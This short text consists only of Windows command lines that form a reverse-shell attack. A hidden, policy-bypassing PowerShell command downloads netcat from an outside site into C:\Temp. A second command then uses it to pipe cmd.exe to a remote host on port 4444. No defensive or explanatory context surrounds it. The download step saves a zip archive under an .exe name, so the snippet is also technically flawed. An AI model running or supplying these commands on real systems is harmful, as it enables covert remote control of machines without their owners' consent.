powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip','C:\Temp\nc.exe');"

C:\Temp\nc.exe -e cmd.exe 192.168.1.25 4444
